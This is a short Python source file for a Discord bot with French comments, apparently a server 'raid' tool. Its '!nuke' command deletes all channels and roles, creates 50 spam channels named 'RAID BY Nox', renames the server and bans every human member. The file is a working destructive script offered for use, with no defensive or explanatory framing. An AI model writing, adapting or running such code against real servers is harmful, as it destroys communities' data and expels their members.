import discord
from discord.ext import commands
import os

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")

@bot.command()
async def nuke(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Nuke en cours...")
        try:
            # Supprimer salons et rôles
            for channel in ctx.guild.channels:
                await channel.delete()

            for role in ctx.guild.roles:
                if role.name != "@everyone":
                    await role.delete()

            # Créer 50 salons et spammer les messages
            for _ in range(50):
                await ctx.guild.create_text_channel("☠️ RAID BY Nox ☠️")

            # Renommer le serveur
            await ctx.guild.edit(name="☠️ RAID BY Nox ☠️")

            # Bannir tous les membres sauf les bots
            for member in ctx.guild.members:
                if not member.bot:
                    await member.ban()

            print("Nuke terminé.")
        except Exception as e:
            await ctx.send(f"Une erreur est survenue pendant le nuke : {str(e)}")
            print(f"Erreur : {str(e)}")
    else:
        await ctx.send("Tu n'as pas la permission d'utiliser cette commande.")

bot.run(os.getenv("TOKEN"))
